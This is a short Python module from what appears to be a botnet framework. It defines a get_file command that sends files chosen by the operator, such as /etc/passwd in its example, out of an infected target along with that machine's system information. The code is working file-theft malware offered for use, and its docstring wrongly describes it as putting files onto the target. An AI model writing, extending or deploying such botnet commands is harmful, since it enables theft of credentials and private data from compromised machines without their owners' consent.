from .. import BotNet, Request, UserException


@BotNet.default_script(script_version="0.0.1")
def get_file(request: Request) -> None:
    """
    put file to target system

    syntax:
        `/get_file [route1] [route2]

    example:
        `/get_file /etc/passwd`
        `/get_file ./file.exe`
    """
    if len(request.command) > 0:
        route = request.command[0]
        for i, route in enumerate(request.command):
            request.engine.send_file(route, {f"file route {i+1}": route, **request.system_info(minimal=True)})
    else:
        raise UserException("no route given")
